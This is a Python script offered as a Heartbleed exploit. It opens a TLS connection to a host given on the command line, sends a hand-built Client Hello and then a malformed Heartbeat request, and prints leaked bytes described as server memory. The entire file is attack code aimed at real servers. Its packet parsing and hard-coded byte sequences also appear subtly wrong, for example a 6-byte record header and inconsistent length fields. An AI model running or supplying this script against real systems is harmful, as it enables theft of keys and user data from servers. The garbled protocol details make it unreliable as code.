#!/usr/bin/env python3
import sys
import socket
import struct
import select
import array

def recv_all(socket, length):
    """Receive exactly 'length' bytes from socket"""
    response = b""
    total_bytes_remaining = length
    
    while total_bytes_remaining > 0:
        readable, _, _ = select.select([socket], [], [])
        if socket in readable:
            data = socket.recv(total_bytes_remaining)
            if not data:
                break
            response += data
            total_bytes_remaining -= len(data)
    
    return response

def read_packet(socket):
    """Read and parse TLS packet"""
    header_length = 6
    header = recv_all(socket, header_length)
    
    if not header:
        return None, None, b"", None
        
    type, version, length, msg_type = struct.unpack('>BHHB', header)
    payload = b""
    
    if length > 0:
        payload = recv_all(socket, length - 1)
        
    return type, version, payload, msg_type

# Client Hello message (TLS 1.2)
client_hello = (
    0x16, 0x03, 0x03, 0x00, 0x2f, 0x01, 0x00, 0x00, 0x2b,
    0x03, 0x03, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10,
    0x11, 0x00, 0x01, 0x02, 0x19, 0x1a, 0x1b, 0x1c, 0x1d,
    0x1e, 0x1f, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09,
    0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x00, 0x00,
    0x02, 0x00, 0x2f, 0x01, 0x00, 0x00, 0x00
)

# Malicious Heartbeat request
heartbeat = (
    0x18, 0x03, 0x03, 0x00, 0x03, 0x01, 0x00, 0x40
)

def exploit(target_host):
    """Execute Heartbleed exploit"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_host, 443))
        
        # Send Client Hello
        s.send(array.array('B', client_hello))
        
        # Wait for Server Hello Done
        server_hello_done = False
        while not server_hello_done:
            type, version, payload, msg_type = read_packet(s)
            if msg_type == 14:  # SERVER_HELLO_DONE
                server_hello_done = True
        
        # Send malicious Heartbeat
        s.send(array.array('B', heartbeat))
        print("[+] Sent malicious Heartbeat request")
        
        # Read response
        type, version, payload, msg_type = read_packet(s)
        if payload:
            print("[+] Received data from server memory:")
            print(payload[:500])  # Print first 500 bytes
            
        s.close()
        
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 heartbleed.py <target_host>")
        sys.exit(1)
        
    exploit(sys.argv[1])
